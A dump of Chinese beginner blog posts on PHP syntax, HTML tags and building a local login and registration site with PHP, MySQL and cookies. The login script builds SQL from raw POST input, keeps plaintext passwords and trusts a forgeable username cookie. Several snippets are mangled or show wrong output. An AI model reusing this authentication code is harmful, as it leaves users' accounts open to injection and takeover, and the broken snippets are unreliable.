如果建立的是html文件，中间嵌有php代码，apache默认是不会将文件传送到PHP应用服务器，因为建立的是HTML文件，会直接返回给请求方。 5.文件末尾的？&gt;结束标签可以省略 6.指令分隔符** ； 1.在一些PHP语句的结尾要加上 ；表示一句话的结束。 2.结束标记?&gt;隐含了一个 ； 所以在?&gt;之前的PHP语句可以省略掉 ； 7.注释 多行注释 / 多行注释 / 单行注释 //单行注释 8.空白的处理**空格，tab制表符，换行 这些写在PHP代码里是没有影响的可以利用这些来增加代码的可读性。 二、变量 变量是用于临时存储值的容器 1.变量的声明​ 在其他语言中，在使用变量前，事先声明一下！ 注意：在PHP程序中，使用变量之前是不需要声明的！（可以直接使用） 变量用于存储 数字、文本字符串 或者数组的！ $变量名=数据（值） 2.变量的销毁​ unset($变量名称) 3.变量的命令规则​ 1.变量名称严格区分大小写 $name,$NAME,$Name都是不同的变量 2.字母或者下划线开头 总结：变量名只能包含 字母 数字 下划线并且以字母或者下划线开头！ 注意：最好不要用关键字作为变量名称 4.可变变量例如： 12345&lt;?php $a='b'//定义一个变量a储存值b $$a='c'//$b='c' echo $b;?&gt; 输出结果为：1c 5.变量的引用赋值引用赋值相当于给变量加了一个别名 12345&lt;?php $b=&amp;$a;//相当于给$a起了一个别名 $b=20; echo $a;?&gt; 输出结果：120 三、变量类型 PHP是一种弱语言 概述：变量类型是指保存在该变量中的数据类型 1.变量类型简介​ bool（布尔型） 在变量里存true 或 false 那么这个变量就是布尔类型 以下值被认为是false，其他值都是被认为是true 布尔值 false 0 浮点型0.0 空白字符串和字符串0//指的是直接一对单引号或者双引号，里面没有如何内容 例如： 1var_dump((bool)\"\")或var_dump((bool)'') 没有成员的数组1var_dump((bool)array()); NULL例如：1var_dump((bool)NULL); 输出结果 都为： bool(false) int（整形）在变量里面存整数，那么这个变量就是整形变量. float（浮点型，也称double）在变量里面存小数，那么这个变量就是浮点型数据. string（字符串）需要加单引号或者双引号例如：1234&lt;?php $a='t'; var_dump($a);?&gt; var_dump($变量名)//将变量值和类型一起输出 单引号PHP不会解析单引号之间的变量 双引号其中的变量名会被变量值代替，即PHP会解析双引号之间的变量例如：123456&lt;?php $b=100; $a=\"te&#123;$b&#125;st\"; var_dump($a); echo $a; ?&gt; 输入结果:12string te100stte100xt 定界符&lt;&lt;&lt;名字 名字；定界符可以包含单引号、双引号、也可以解析变量例如：1234567&lt;?php $b=200; $a=&lt;&lt;&lt;abc; wwwww&#123;$b&#125;w abc; var_dump($a) ?&gt; 输出结果：1string wwwww200w array(数组)objec（对象）resource（资源）NULL例如：1234&lt;?php $a=null; var_dump($a); ?&gt; 输出结果:1null 二、变量类型相互转化变量类型强制转化例如： 12345&lt;?php $a='www'; $b=(int)$a; var_dump($b); ?&gt; 输出结果：1int 0 四、常量 常量是用于临时（只有在我们的程序的运行过程中才存在）存储值（数据）的容器 定义和使用define(‘常量名称’，常量值)或者define(“常量名称”，常量值)例如:1234&lt;?php define('WWW',10) echo WWW ?&gt; 输出结果：10 常量的命名： 1.和变量一样 只能包含字母、数字、下划线 并且必须以字母或下划线开头。 2.按照惯例常量的名称总是大写的。 3.自定义常量总是严格区分大小写的！ 常量和变量的区别 1.常量前面没有没有符号$ 2.常量只能用define()函数来定义，不能通过赋值语句来定义 3.常量可以不用理会变量范围的规则而在任何地方定义和使用 4.常量一旦被定义就不能重新定义或者取消定义 5.常量的值只能是bool,int,float,string类型 预定义常量 预定义常量是PHP已经定好了的常量 有的预定义常量是以_开头，这些预定义常量叫做魔术常量 代码所在的位置不同 值也是不同的。 1234例如： _LINE_ _FILE_//这些都是魔术常量预定义常量是不区分大小写的 五、运算符 概述： 运算符是对一个或者多个操作数（变量或者数值）执行某种运算的符号，也称操作符！ 算术运算符1 .+例如： 12345&lt;?php $a=1; $b=2; echo $a+$b; ?&gt; 输出结果：3 -第一个意思：减号第二个意思：取反 1234&lt;?php $a=1; -$a;?&gt; 输出结果：-1取反并不会影响到被取反变量本身的值！ *例如：123456&lt;?php &amp;a=1; &amp;b=2; $c=$a*$b; echo $c;?&gt; 输出结果：2 /例如：12345&lt;?php $a=10; $b=2; echo $a/$b;?&gt; 输出结果：5 5.%取模（取余）例如：12345&lt;?php $a=10; $b=3; echo $a%$b; ?&gt; 输出结果： 1 6.++自增例如:12345&lt;?php $a=1; ++$a; echo $a;?&gt; 输出结果： 2 如果 ++在变量之后例如：1234&lt;?php $a=1; echo $a++; ?&gt; 输出结果: 1 7.-- 自减例如：12345&lt;?php $a=10; $a--; echo $a;?&gt; 输出结果： 9 1234&lt;?php $a=10; echo $a--;?&gt; 输出结果： 10 注意：自增自减是对变量来说的！ 字符串运算符1 . 连接运算符例如： 123456&lt;?php $a='i'; $b='is'; $c='hacker'; echo $a.$b.$c;?&gt; 输出结果： iamhacker 2 = 赋值运算符 注意：赋值运算符整个语句是有值的，所以整个语句就是一个表达式，所以我们也可以怎么写： $a=$b=2;相当于$a=($b=2) 把右边的值赋给左边的变量 二元运算符+=运算符 例如：123456&lt;?php $a=1; $b=2; $a+=$b; echo $a;?&gt; 输出结果： 3 -=运算符123456&lt;?php $a=2; $b=1; $a-=$b; echo $a; ?&gt; 输出结果： 1 除此之外，赋值运算符还有 *= /= %= .= 比较运算符 PHP中规定： 使用echo输出布尔类型值的时候 echo true;它在页面中会输出1 echo false;它会在页面中什么都不输出 需要输出布尔类型值的时候最好使用var_dump()这个函数来输出 对操作数（按照比较运算符的要求，规则）进行比较 如果比较出的结果满足比较运算符的要求那么结果就是true（真，成立），否则就是false(假，不成立) 1.==比较左右两边数的值是否相等例如：12345&lt;?php $a=1; $b=1; var_dump($a==$b);?&gt; 输出结果：1bool(true) 2.===全等（值要相等，类型也要相等）例如：12345&lt;?php $a=11; $b='11'; var_dump($a===$b); ?&gt; 输出结果： bool(false) 3.!= 比较值是否不相等 例如：12345&lt;?php $a=1; $b=11; var_dump($a!=$b);?&gt; 输出结果： bool(true) 4.&lt;&gt; 比较值是否不相等5.!==不全等如果两边的操作数不全等那么就是true, 否则就是false php会自动转化类型例如： 12345&lt;?php $a=11; $b='11'; var_dump($a!=$b);?&gt; 输出结果：1bool(false) 12345&lt;?php $a=11; $b='11'; var_dump($a!==$b); ?&gt; 输出结果:1bool(true) 因为类型不一样 6.&lt; 小于比较两边的操作数例如：12345&lt;?php $a=1; $b=1; var_dump($a&lt;$b); ?&gt; 输出结果：1bool(false) 7.&gt; 大于 8. &lt;= 小于等于 9. &gt;= 大于等于 逻辑运算符 概念： 对表达式进行逻辑运算，运算出的结果是布尔类型的值(true,false) 要求： 参与逻辑运算的表达式的值是布尔类型的值，如果不是布尔类型的值会被PHP自动转化成布尔类型的值，然后参与运算。 1.逻辑与 and 或者 &amp;&amp; 左右两边的表达式的值都为true时，运算结果为true。只要其中有一个false，结果就是false。例如：12345&lt;?php $a=true; $b=true; var_dump( $a &amp;&amp; $b); ?&gt; 输出结果：1bool(true) 短路问题： 语言规定： 只要有逻辑运算符（逻辑与、逻辑或）那么运算结果就是一个true或false例如：123456&lt;?php $a=false; $b=1; $a &amp;&amp; ++$b; echo $b; ?&gt; 输出结果： 1 2.逻辑或 or 或者 || 左右两边的表达式的值有一个为true，运算的结果就是true ,只有当两边的值都是false的时候，结果才会是false。 例如：12345&lt;?php $a=true; $b=false; var_dump($a || $b) ?&gt; 输出结果：1bool(true) 短路问题：123456&lt;?php $a=true; $b=1; &amp;a || $ ++b; echo $b; ?&gt; 输出结果： 1 3.逻辑异或 xor 运算规则：左右两边表达式的值不一样的时候结果就是true，如果一样那么结果就是false例如：12345&lt;?php $a=false; $b=true; var_dump($a xor $b); ?&gt; 输出结果：1bool(true) 4.逻辑非 ！ 运算规则：将原来的表达式的值否定掉，原来是true，那么结果就是false例如：1234&lt;?php $a=false; var_dump(!$a); ?&gt; 输出结果： 1bool(true) 5.其他运算符1.？：三元运算符格式： 表达式1?表达式2:表达式3：如果表达式1的值为true，那么就执行表达式2，否则就执行表达式3例如：1234&lt;?php $a=true ? 10 : 20; echo $a; ?&gt; 输出结果：110 2.@屏蔽表达式可能发送错误；在表达式前面加上@ 6.运算符的优先级优先级的概念： 谁的优先级别高，就先执行谁 结合方向 规定了从那个方向开始算的问题 优先级归纳： 1)[结合方向：无]递增递减 2)[右]逻辑非! 3)[左]乘，除，取余 4)[左]加，减，字符串连接符 5)[无]包含大于号或者小于号的比较运算符 6)[无]不包含大于号或者小于号的比较运算符 7)[左]逻辑与&amp;&amp; 8)[左]逻辑或|| 9)[左]? : 10)[右]赋值运算符 12)[左 ]逻辑异或xor 园括号的作用： 用圆括号可以将表达式里面的某一块看成一个整体例如：1234&lt;?php $a=(1+5)*3 echo $a; ?&gt; 输出结果：118 另外使用括号可以增强代码的可读性 流程控制【1】-if语句：1.顺序执行 自上而下执行即可 对执行过程没有控制2.分支执行分支执行可以根据条件是否满足来选择某些代码，PHP的分支执行主要是通过两种语句（if\\switch）来实现 1.if语句：1)单向条件if（表达式） 语句； 表达式的值为true，那么就执行语句1，否则就不执行！例如：123456&lt;?php $a=400; $b=40; if($a&gt;$b) echo \"1\"; echo \"2\"; ?&gt; 输出结果：112 流程控制【2】-switch语句：1234567891011switch(表达式)&#123; case 值 1://case相当于== 语句块1; break; case 值 2: 语句块2; break; ....... default: 语句块n &#125; 循环语句：1.while语句123while(表达式)&#123; 各种语句.... &#125; 2.do…while语句123do&#123; 各种语句 &#125;while(表达式); 3.for语句123for(表达式a;表达式b;表达式c)&#123; 各种语句 &#125; 特殊的流程控制语句1.break语句 2.continue语句 3.exit()语句 作用：结束当前整个程序的执行！","categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://bealright.github.io/tags/PHP/"}]},{"title":"HTML学习总结","slug":"HTML学习总结","date":"2019-03-24T07:38:24.000Z","updated":"2019-06-07T07:53:14.308Z","comments":true,"path":"2019/03/24/HTML学习总结/","link":"","permalink":"http://bealright.github.io/2019/03/24/HTML学习总结/","excerpt":"","text":"HTML的基本结构1234567891011&lt;!DOCTYPE html&gt;&lt;!--文档类型--&gt;&lt;html lang=\"zh\"&gt;&lt;!--加上lang属性声明语言--&gt;&lt;head&gt;&lt;meta charset=\"UTF-8\"&gt;&lt;!--利用UTF-8格式来解析--&gt;&lt;title&gt;&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; HTML——文本文本标签 12345&lt;p&gt;段落标签&lt;/p&gt;&lt;h&gt;标题标签&lt;/h&gt;&lt;br&gt;换行标签（单标签）&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;xxx&lt;/p&gt;&lt;!--&amp;nbsp;代表空格--&gt; 文本格式化标签12345&lt;strong&gt;文本加粗标签&lt;/strong&gt;&lt;em&gt;斜体标签&lt;/em&gt;&lt;del&gt;删除标签&lt;/del&gt;&lt;span&gt;&lt;/span&gt;&lt;p&gt;&lt;strong&gt;&lt;em&gt;&lt;del&gt;phpStudy是一个PHP调试环境的程序集成包&lt;/del&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt; 输出结果：phpStudy是一个PHP调试环境的程序集成包 HTML_图片1234567&lt;img&gt;图像标签&lt;img src=\"\"&gt;&lt;!--src属性放图片--&gt;&lt;img src=\"\" alt=\"\"&gt;&lt;!--alt属性当图片显示不出来时作为可替换文本--&gt;&lt;img src=\"\" alt=\"\" title=\"\"&gt;&lt;!--title属性 点击图片会出现相应的文字--&gt; 图片格式： jpg 有损压缩 影响画质 图片小png 无损压缩 不影响画质 大 有透明通道gif 动图 图片方式： 网络图片 本地图片：相对路径：从当前路径算起的路径 绝对路径：从盘符算起的路径 例如： 相对路径：01.jpg绝对路径：C:\\Users\\用户名\\Pictures\\桌面壁纸\\01.jpg HTML——超链接123456789&lt;a&gt;超链接标签&lt;/a&gt;&lt;a href=\"\" &gt;文本&lt;/a&gt;&lt;!--href属性 填写文件或网页地址--&gt;&lt;a href=\"\" target=\"_balnk\"&gt;文本&lt;/a&gt;&lt;!--target属性保留原来的界面--&gt;&lt;a href=\"\" target=\"_balnk\"&gt; &lt;img src=\"\" alt=\"\"&gt; &lt;!--放图片--&gt;&lt;/a&gt; 例如：1&lt;a href=\"https://www.bilibili.com/\" target=\"_balnk\"&gt;bilibili&lt;/a&gt; 123&lt;a href=\"https://www.bilibili.com/\" target=\"_balnk\"&gt; &lt;img src=\"u=3745332628,2276842928&amp;fm=27&amp;gp=0.jpg\" alt=\"bilibili\"&gt;&lt;/a&gt; 书签标签 锚点1234567&lt;a href=\"#end\"&gt;回到页面最下面&lt;/a&gt;&lt;p&gt;段落&lt;/p&gt;...&lt;p id=end&gt;最后一段段落&lt;/p&gt;&lt;!--直接跳转到最后一个段落--&gt; 如图所示： 图片的映射 shape属性 形状 circle 园 rect 矩形 poly 多边形coords属性 坐标点 例如：1234567&lt;img src=\"2.jpg\" alt=\"\" usemap=\"#bili\"&gt; &lt;map name=\"bili\"&gt;地图 &lt;area shape=\"circle\" coords=\"184,245,100\" href=\"https://www.bilibili.com/\" alt=\"\"&gt;可点击区域 &lt;area shape=\"rect\" coords=\"\" href=\"https://www.bilibili.com/\" alt=\"\"&gt;可点击区域 &lt;/map&gt;&lt;!-- 园coords=“中心坐标，园的半径”--&gt;&lt;!--矩形coords=“左上角点的坐标，右下角点的坐标”--&gt; HTML列表 列表有三类1无序列表：内容列表 ，标签ul+li 无顺序关系2有序列表：内容列表 标签ol+li 有顺序关系3自定义列表： 内容标题+内容 列表 标签dl+dt+dd 例如：12345678&lt;ul&gt;&lt;li&gt;无序列表&lt;/li&gt;&lt;li&gt;无序列表&lt;/li&gt;&lt;li&gt;无序列表&lt;/li&gt;&lt;li&gt;无序列表&lt;/li&gt;&lt;li&gt;无序列表&lt;/li&gt;&lt;li&gt;无序列表&lt;/li&gt;&lt;/ul&gt; 1234567&lt;ol&gt;&lt;li&gt;有序列表&lt;/li&gt;&lt;li&gt;有序列表&lt;/li&gt;&lt;li&gt;有序列表&lt;/li&gt;&lt;li&gt;有序列表&lt;/li&gt;&lt;li&gt;有序列表&lt;/li&gt;&lt;/ol&gt; HTML——表格1234567&lt;table&gt;表格标签&lt;/table&gt;&lt;tr&gt;行标签&lt;/tr&gt;&lt;th&gt;标题标签&lt;/th&gt;&lt;td&gt;内容标签&lt;/td&gt;&lt;table border=\"\"&gt;&lt;td colspan=\"填写需要的列数\"&gt;&lt;/td&gt;&lt;td rowspan=\"填写需要的行数\"&gt;&lt;/td&gt; colspan属性单元格可横跨的列数rowspan属性单元格可横跨的行数border属性加边框 例如：1234567891011121314&lt;table&gt;&lt;tr&gt;&lt;th&gt;班级&lt;/th&gt;&lt;th&gt;姓名&lt;/th&gt;&lt;th&gt;学号&lt;/th&gt;&lt;th&gt;成绩&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;3&lt;/td&gt;&lt;td&gt;4&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt; 12加边框&lt;table border=\"1\"&gt; 12&lt;td colspan=2&gt;1&lt;/td&gt;&lt;td rowspan=2&gt;2&lt;/td&gt; HTML表单 表单是用来收集用户输入 提交给服务器http: 超文本传输协议 浏览器和服务器的通讯。模式： 请求——应答 浏览器主动发起请求 服务器接收服务器做处理 返回给浏览器 浏览器显示结果。12345&lt;form action=\"\"&gt;表单标签&lt;/form&gt;用户名&lt;input type=\"text\" name=\"自己所取的名字\"&gt;密码&lt;input type=\"password\" name=\"自己设定的密码\"&gt;&lt;!--name属性是告诉浏览器 填入的东西是用户名或密码--&gt;提交按钮&lt;input type=\"submit\"&gt; 例如：12345&lt;form action=\"\"&gt; 用户名&lt;input type=\"text\" name=\"woo\"&gt; 密码&lt;input type=\"password\" name=\"iii\"&gt; &lt;input type=\"submit\"&gt;&lt;/form&gt; 单选框12&lt;input type=\"radio\" name=\"\"&gt;&lt;!--注意名字要保持一致，否则不是一组--&gt; 例如：1234&lt;form action=\"\"&gt; &lt;input type=\"radio\" name=\"sex\"&gt;男 &lt;input type=\"radio\" name=\"sex\"&gt;女&lt;/form&gt; 复选框1&lt;input type=\"checkbox\" name=\"\"&gt; 例如：1234&lt;form action=\"\"&gt; &lt;input type=\"checkbox\" name=\"sex\"&gt;男 &lt;input type=\"checkbox\" name=\"sex\"&gt;女&lt;/form&gt; 下拉框123&lt;select name=\"\"&gt; &lt;option value=\"\"&gt;文本&lt;/option&gt;&lt;/select&gt; 例如：12345678&lt;form action=\"\"&gt;城市：&lt;select name=\"城市\"&gt; &lt;option value=\"\"&gt;武汉&lt;/option&gt; &lt;option value=\"\"&gt;郑州&lt;/option&gt; &lt;option value=\"\"&gt;北京&lt;/option&gt; &lt;option value=\"\"&gt;广州&lt;/option&gt;&lt;/select&gt;&lt;/form&gt; 12345如果提交服务器则需要value属性&lt;input type=\"\" name=\"\" value=\"\"&gt;action属性 提交给网页 可以跳转到该网页&lt;form action=\"\"&gt;&lt;/form&gt; 例如：123456&lt;form action=\"https://www.bilibili.com/\" &gt; 用户名&lt;input type=\"text\" name=\"woo\"&gt; 密码&lt;input type=\"password\" name=\"iii\"&gt; &lt;input type=\"submit\"&gt;&lt;/form&gt;&lt;！--输入用户名和密码后会跳转到指定的网页上--&gt; HTML有两种请求方式 POST GET区别: GET 请求会将get的内容会放在网址里面。 如:![在这里插入图片描述](https://github.com/bealright/bealright.github.io/blob/master/htmlstudyphoto/15.png?raw=true) POST请求会将post的内容放在http的head里面 如： ![在这里插入图片描述](https://github.com/bealright/bealright.github.io/blob/master/htmlstudyphoto/16.png?raw=true) 此时网址不发生任何变化 HTML嵌套规则 块元素：独立成一行 可以设置宽高 默认宽高100% 文字类块元素：12&lt;p&gt;&lt;/p&gt;标签&lt;h&gt;&lt;/h&gt;标签 容器类块元素：12345678910111213标签有：&lt;div&gt;&lt;/div&gt;&lt;table&gt;&lt;/table&gt;&lt;tr&gt;&lt;/tr&gt;&lt;td&gt;&lt;/td&gt;&lt;th&gt;&lt;/th&gt;&lt;form&gt;&lt;/form&gt;&lt;ul&gt;&lt;/ul&gt;&lt;li&gt;&lt;li&gt;&lt;ol&gt;&lt;/ol&gt;&lt;dl&gt;&lt;/dl&gt;&lt;dt&gt;&lt;/dt&gt;&lt;dd&gt;&lt;/dd&gt; 行元素：不独立成一行。12345678标签有：&lt;a&gt;&lt;img&gt;&lt;input&gt;&lt;strong&gt;&lt;em&gt;&lt;del&gt;&lt;span&gt; 特殊元素：12&lt;br&gt;&amp;nbsp; 嵌套规则 一：块元素可以嵌套行元素1&lt;div&gt; &lt;a href=\"\"&gt; &lt;/a&gt; &lt;/div&gt; 二：行元素可以嵌套行元素1&lt;a href=\"\" &gt; &lt;strong&gt; &lt;/strong&gt; &lt;/a&gt; 三：行元素不可以嵌套块元素12&lt;a href=\"\"&gt; &lt;div&gt; &lt;/div&gt; &lt;/a&gt;这个便是错误的 四：文字类块元素不可以嵌套块元素 五：容器类块元素 可以嵌套块元素1&lt;div&gt;&lt;p&gt;&lt;/p&gt;&lt;/div&gt;","categories":[],"tags":[{"name":"HTML","slug":"HTML","permalink":"http://bealright.github.io/tags/HTML/"}]},{"title":"本地搭建简易的登陆注册网页","slug":"HTML+CSS+PHP+COOKIE在本地搭建一个简易的登陆注册网页","date":"2019-03-20T02:38:24.000Z","updated":"2019-06-07T07:53:19.698Z","comments":true,"path":"2019/03/20/HTML+CSS+PHP+COOKIE在本地搭建一个简易的登陆注册网页/","link":"","permalink":"http://bealright.github.io/2019/03/20/HTML+CSS+PHP+COOKIE在本地搭建一个简易的登陆注册网页/","excerpt":"","text":"昨天晚上看了一叶飘零大佬的直播，大佬说：初学者最好自己先动手去做一些项目，这样能更好的了解原理，恰好学长要求做一个简易的登陆注册系统，利用这个机会再学习一波。 做了两天，搞懂了很多概念，也遇到了很多问题，但是这个过程特别有意思，记录一下，把那些学到的知识也总结一下。 一：准备工作打开mySQL打开网站根目录这里我直接放在了WWW目录下，有点乱。这样准备工作就做好了，开始奋斗了。 开始之前把我写的php文件简单描述一下：login.php（登陆页面)logincookie.php（连接数据库+设置cookie页面）welcome.php (判断是否有cookie以防绕过+登陆后呈现的页面)end.php (清除cookie页面)Register.php (注册页面)linkmysql.php（注册时连接数据库页面）Register link.php（注册判断是否注册成功和导入数据库用户信息页面）fail.php (登陆失败页面) 二：创建登陆页面和注册页面 感悟：那句话怎么说，学到用时方恨少，差不多就这个意思，之前学过HTML和CSS，但一自己写。。。，就会写个简单的表单，无非就是加一个外部样式CSS改一下背景颜色什么的。。。所以还得查大佬的。 这个样式干净又好看（自己认为），所以模仿，但是并非是复制粘贴，自己一步一步敲。。。（下面是转载自mind_programmonkey 大佬的CSS)12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364html&#123; width: 100%; height: 100%; overflow: hidden; font-style: sans-serif;&#125;body&#123; width: 100%; height: 100%; font-family: 'Open Sans',sans-serif; margin: 0; background-color: #4A374A;&#125;#login&#123; position: absolute; top: 50%; left:50%; margin: -150px 0 0 -150px; width: 300px; height: 300px;&#125;#login h1&#123; color: #fff; text-shadow:0 0 10px; letter-spacing: 1px; text-align: center;&#125;h1&#123; font-size: 2em; margin: 0.67em 0;&#125;input&#123; width: 278px; height: 18px; margin-bottom: 10px; outline: none; padding: 10px; font-size: 13px; color: #fff; text-shadow:1px 1px 1px; border-top: 1px solid #312E3D; border-left: 1px solid #312E3D; border-right: 1px solid #312E3D; border-bottom: 1px solid #56536A; border-radius: 4px; background-color: #2D2D3F;&#125;.but&#123; width: 300px; min-height: 20px; display: block; background-color: #4a77d4; border: 1px solid #3762bc; color: #fff; padding: 9px 14px; font-size: 15px; line-height: normal; border-radius: 5px; margin: 0;&#125;--------------------- 作者：mind_programmonkey 来源：CSDN 原文：https://blog.csdn.net/Mind_programmonkey/article/details/78522494 这是我的HTML代码123456789101112131415161718192021222324&lt;?php?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;title&gt;请登陆&lt;/title&gt; &lt;link rel=\"stylesheet\" type=\"text/css\" media=\"screen\" href=\"1.css\"&gt; &lt;script src=\"main.js\"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=\"login\"&gt; &lt;h1&gt;login&lt;/h1&gt; &lt;form action=\"logincookie.php\" method=\"post\"&gt; &lt;input type=\"text\" name=\"username\" placeholder=\"用户名\" /&gt;&lt;input type=\"password\" name=\"password\" placeholder=\"密码\" /&gt; &lt;br /&gt; &lt;button class=\"tj\" type=\"submit\"&gt;登陆&lt;/button&gt; &lt;/form&gt; &lt;form action=\"Register.php\" method=\"post\"&gt; &lt;button class=\"zc\" type=\"submit\"&gt;注册&lt;/button&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 做之前没有懂其中的一些东西，现在做完了把之前不懂的弄懂。（下面是我的，就是一些值改过）123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172body &#123; width: 100px; height: 100px; background-color: beige; background-image: url(28.jpg);//加一张图片&#125;#login&#123; position: absolute;//通过绝对定位，元素可以放置到页面上的任何位置。下面的标题距离页面左侧 50%，距离页面顶部 50%。 top:50%; left:50%; margin: -150px 0 0 -150px;//这个简写属性设置一个元素所有外边距的宽度，或者设置各边上外边距的宽度。该属性可以有 1 到 4 个值，上外边距是 -150px，右外边距是 0px，下外边距是 0px，左外边距是 -150px width: 300px; height: 300px;&#125;#login h1&#123; color: #9393FF; text-shadow: 0 0 10px;//text-shadow 属性向文本设置阴影,其他添加的效果可以在W3school查到。 letter-spacing: 1px;//letter-spacing 属性增加或减少字符间的空白（字符间距） text-align: center;//text-align 属性规定元素中的文本的水平对齐方式，这里是居中对齐。&#125;h1 &#123; font-size: 2em; margin: 0.67em 0;&#125;input &#123; width: 300px; height: 20px; margin-bottom: 10px;//margin-bottom 属性设置元素的下外边距 outline: none;//outline （轮廓）是绘制于元素周围的一条线，位于边框边缘的外围，可起到突出元素的作用 padding: 10px;//padding 简写属性在一个声明中设置所有内边距属性,所有 4 个内边距都是 10px. font-size: 20px; color: #fff; text-shadow: 1px 1px 1px;//text-shadow属性向文本设置阴影 border-top: 1px solid #312E3D;//border-top 属性在一行声明中为上边框设置所有的属性 border-left: 1px solid #312E3D; border-right: 1px solid #312E3D; border-bottom: 1px solid #56536A; border-radius: 4px; background-color:#2D2D3F;&#125;.tj &#123; width: 300px; min-height: 20px; display: block; background-color: #4a77d4; border: 1px solid #3762bc;//border 简写属性在一个声明设置所有的边框属性 color: #fff; padding: 9px 14px; font-size:15px; line-height: normal;// border-radius: 5px; margin: 0px;&#125;.zc &#123; width: 300px; min-height: 20px; display: block; background-color: #33CC33; border: 1px solid #3762bc; color: #fff; padding: 9px 14px; font-size:15px; line-height: normal;//line-height 属性设置行间的距离（行高） border-radius: 5px; margin: 0px;&#125; 了解了这些属性，但还是不知道为啥大佬这样设置其中的一些数据，毕竟目前是小白，慢慢来吧。 我用的是CSS外部样式表,把CSS存到1.css文件中，在login.php（登陆页面）文件中引用。1&lt;link rel=\"stylesheet\" type=\"text/css\" media=\"screen\" href=\"1.css\"&gt; 这样，就完成了第一步！实现效果如下：在登陆页面加一个注册按钮 在1.css里面添加一段12345678910111213.zc &#123; width: 300px; min-height: 20px; display: block; background-color: #33CC33; border: 1px solid #3762bc; color: #fff; padding: 9px 14px; font-size:15px; line-height: normal;//line-height 属性设置行间的距离（行高） border-radius: 5px; margin: 0px;&#125; 实现效果：再做一个注册页面（Register.php），采用相同的CSS，换个颜色即可。Register.php代码如下：1234567891011121314151617181920&lt;?php?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;title&gt;请注册&lt;/title&gt; &lt;link rel=\"stylesheet\" type=\"text/css\" media=\"screen\" href=\"3.css\"&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=\"Register\"&gt; &lt;h1&gt;Register&lt;/h1&gt; &lt;form action=\"Register link.php\" method=\"POST\"&gt; &lt;input type=\"text\" name=\"username\" placeholder=\"请输入用户名\" /&gt;&lt;input type=\"password\" name=\"password\" placeholder=\"请输入密码\" /&gt; &lt;br /&gt; &lt;button class=\"zc\" type=\"submit\"&gt;注册&lt;/button&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 实现效果如下：这样就实现了登陆页面和注册页面。 三：连接mySQL和设置COOKIE我们的登陆页面和注册页面都已经做好了，现在就来写一个PHP文件来连接数据库并且设置一下cookie.logincookie.php（连接数据库+设置cookie页面）代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?php//第一次登陆的时候，通过用户输入的信息来确认用户header('Content-type: texy/html;charset=utf-8');//设置编码，防止乱码if ( ( $_POST['username'] != null ) &amp;&amp; ( $_POST['password'] != null ) ) &#123;//判断输入是否为空 $userName = $_POST['username'];//post方式接收传来的参数，用定义的$userName和$password接收 $password = $_POST['password']; //从数据库获取用户信息 //数据库连接信息 分别为主机 数据库用户名 密码 $conn = mysqli_connect('localhost','root','root'); mysqli_select_db($conn,'login');//连接所创建的login数据库 $sql = \"select * from user where username = '$userName'\";//从数据库表中获取数据 $res = mysqli_query($conn,$sql);//针对login这个数据库进行查询, 查询是否存在有这个用户名 $row = mysqli_fetch_array($res);//输出查询结果，传给$row if ($row['username']!=$userName) &#123; echo '不能登陆'; header('Location:fail.php'); &#125; else if($row['username']==$userName&amp;&amp;$row['password']!=$password) &#123; echo '不能登陆'; header('Location:fail.php'); &#125; else if($row['username']!=$userName&amp;&amp;$row['password']!=$password) &#123; echo '不能登陆'; header('Location:fail.php'); &#125; else if($row['username']==$userName&amp;&amp;$row['password'] ==$password) &#123; //如果密码验证通过，设置一个cookies，把用户名保存在客户端 setcookie('username',$userName,time()+3600);//设置一个小时 //最后跳转到登录后的欢迎页面 echo '登陆成功'; header('Location:welcome.php');//跳转到最后的欢迎页面 &#125;&#125;else &#123; echo '登陆失败'; header('Location:fail.php');//跳转到失败页面&#125; 这里面的PHP连接数据库语法，需要学习一下才能知道这些语句的意思。w3school网站这个网站特别好，特别详细，从这里面可以学习到PHP连接mySQL语法。123例如：mysql_connect(servername,username,password);//主机名、数据库用户名、密码//一般初始的数据库用户名和密码都是 root 语法学习会再总结一个单独的博客来记录一下，这里主要介绍一下搭建流程和遇到的问题。 通过PHP连接mySQL语法我们就可将用户输入的信息用POST方式传入到数据库中，然后利用查询语句进行查询数据库数据，进行比对，然后判断用户名和密码是否与数据库所存数据相同。 接下来实现cookie，一开始真的不知道有什么用处，查了一些博客，看了一些概念，就知道是把用户的信息存储到客户端，方便用户下次登入。但其实cookie也可以设置防绕过的功能，就例如：如果我不设置cookie，那么我的登陆页面和最终页面都是独立的，靠的也只是HTML中的&lt;form action=&quot; &quot;&gt; 来连接进行跳转功能。但这样不安全，如果对方注册一个用户，登陆到你的最终页面，可以直接在url地址栏里直接输入这个文件，例如我的最终页面是welcome.php，对方一输入没有如何阻拦，直接就可以进入。所以设置cookie的作用不仅是把用户的信息保存在客户端，更重要的防止绕过。 cookie的具体介绍可以看一下B站孙胜利老师的讲解的和菜鸟教程官网上的介绍，特别详细。 一开始模仿大佬做，设置了两个cookie，一个是用户名的。另一个是密码的，但已经写过注销cookie了PHP文件却依旧能在url地址栏里直接进入后台，一开始真的不知道错误点在那，搞了很长时间，但这个过程及其有意思，查资料，问朋友，自己修改代码。最后发现。。。，其实完全不用设置密码的cookie了，我设置用户名cookie的前提便是用户名输入和数据库密码相等了，所以只要设置一个用户名cookie，便能够识别和登陆。也可以在注销cookie时，把密码的cookie注销，之前直接能登入后台就是因为我设置了两个cookie，却只清除了一个。。。 